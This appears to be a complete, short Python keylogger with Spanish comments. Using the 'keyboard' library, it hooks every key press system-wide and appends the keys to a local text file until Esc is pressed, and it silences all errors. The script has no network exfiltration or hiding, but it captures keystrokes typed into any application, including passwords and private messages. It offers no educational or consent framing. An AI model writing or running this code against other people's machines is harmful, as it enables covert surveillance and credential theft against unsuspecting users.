import keyboard

LOG_FILE = "captura de teclado.txt"

def on_key_press(event):
    """
    Función que se ejecuta cada vez que se presiona una tecla.
    Escribe la tecla en el archivo de registro.
    """
    with open(LOG_FILE, "a", encoding="utf-8") as f:
        # Si la tecla tiene un nombre de un solo carácter (como letras o números),
        # lo escribimos directamente. Si no (como 'space', 'enter', 'shift'),
        # lo escribimos entre corchetes para distinguirlo.
        if len(event.name) == 1:
            f.write(event.name)
        elif event.name == "space":
            f.write(" ")
        elif event.name == "enter":
            f.write("\n")
        else:
            f.write(f"[{event.name}]")

def main():
    try:
        keyboard.on_press(on_key_press)
        keyboard.wait('esc')
    except Exception:
        pass

if __name__ == "__main__":
    main()
